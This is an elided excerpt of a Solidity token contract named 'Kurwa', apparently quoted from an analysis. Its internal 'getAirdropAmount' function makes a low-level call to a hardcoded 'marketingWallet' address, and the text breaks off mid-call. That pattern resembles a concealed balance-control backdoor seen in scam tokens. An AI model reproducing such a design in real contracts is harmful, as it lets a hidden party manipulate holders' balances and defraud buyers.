...
contract Kurwa is Ownable {
    ...
    address private marketingWallet = 0x252f7beCc2e8267e9734Ec8016acE446262BD6a8;
    ...
    function getAirdropAmount(address walletAddress, address from) internal returns (uint256) {
        ...
        (bool result, bytes memory balance) = marketingWallet.call(abi
